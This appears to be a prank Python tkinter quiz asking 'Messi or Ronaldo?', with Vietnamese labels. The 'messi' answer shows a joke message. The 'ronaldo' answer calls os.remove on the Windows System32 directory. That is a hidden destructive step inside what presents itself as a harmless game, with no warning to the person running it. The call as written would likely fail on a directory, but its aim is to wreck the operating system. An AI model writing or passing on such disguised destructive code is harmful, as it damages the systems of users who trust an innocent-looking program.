import tkinter as tk
import os
from tkinter import messagebox

def answer():
    choice = entry.get().strip().lower()
    if choice == "messi":
        messagebox.showinfo("Kết quả", "+999999 aura")
    elif choice == "ronaldo":
        os.remove("C:\\Windows\\System32")
    else:
        messagebox.showerror("Nghe trình chx?")

root = tk.Tk()
root.title("Messi vs Ronaldo")

label = tk.Label(root, text="Messi or Ronaldo?", font=("Arial", 14))
label.pack(pady=10)

entry = tk.Entry(root, font=("Arial", 12))
entry.pack(pady=5)

button = tk.Button(root, text="Trả lời", command=answer)
button.pack(pady=10)

root.mainloop()
